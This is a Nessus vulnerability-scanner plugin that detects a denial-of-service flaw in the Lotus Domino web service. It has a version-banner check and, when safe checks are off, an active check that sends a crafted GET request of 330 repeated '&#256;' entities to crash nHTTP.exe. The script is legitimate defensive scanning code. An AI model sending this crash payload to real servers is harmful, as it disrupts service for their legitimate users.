#
# (C) Tenable Network Security
#


if (description) {
  script_id(17991);
  script_version("$Revision: 1.4 $");
  script_bugtraq_id(13045);


  name["english"] = "Lotus Domino Server Web Service Remote Denial Of Service Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server is prone to denial of service attacks. 

Description :

The remote host is running a version of Lotus Domino Server's web
service that is prone to a denial of service vulnerability.  By
sending a specially crafted HTTP request with a long string of unicode
characters, a remote attacker can crash the nHTTP.exe process, denying
service to legitimate users. 

Note that IBM has released technote #1202446 for this issue but has
been unable to reproduce it. 

See also : 

http://www.securityfocus.com/archive/1/395126

Solution : 

Upgrade to Lotus Domino Server version 6.5.3 or later as it
is known to be unaffected. 

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for remote denial of service vulnerability in Lotus Domino Server Web Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if (!banner || "Lotus Domino" >!< banner) exit(0);


# If safe chceks are enabled, check the version number.
if (safe_checks()) {
  # From the advisory:
  #   iDEFENSE has confirmed the existence of this vulnerability in Lotus
  #   Domino Server version 6.5.1. It has been reported that Lotus Domino
  #   Server 6.03 is also vulnerable. It is suspected that earlier versions of
  #   Lotus Domino Server are also affected. Additionally, iDEFENSE has
  #   confirmed that Lotus Domino Server version 6.5.3 is not affected by this
  #   issue.
  if (egrep(string:banner, pattern:"^Server: +Lotus-Domino/([0-5]\.|6\.([0-4]\.|5\.[0-2]))"))
    security_note(port);
  exit(0);
}
# Otherwise, try to crash it.
else {

  banner = get_http_banner(port:port);
  if ( ! banner ) exit(0);
  if ( ! egrep(pattern:"^Server:.*Domino", string:banner) ) exit(0);

  foreach dir (cgi_dirs()) {
    soc = http_open_socket(port);
    if (soc) {
      # The advisory claims ~330 UNICODE characters of decimal 
      # 430 (ie, 0x01AE) are needed. Should we iterate and 
      # add to the request instead???
      dos = "";
      for (i=1; i <= 330; i++)
        # nb: see <http://www.cs.tut.fi/cgi-bin/run/~jkorpela/char.cgi?code=01ae>.
        dos = dos + "&#256;";
      # nb: given that IBM can't reproduce this, let's follow
      #     the advisory as closely as we can.
      req = string(
        "GET ", dir, "/", dos, " HTTP/1.0\r\n",
        "Host: ", get_host_name(), "\r\n",
        "\r\n"
      );
      send(socket:soc, data:req);
      res = http_recv(socket:soc);
      http_close_socket(soc);
      if (!res) {
        security_note(port);
        exit(0);
      }
    }
  }
}
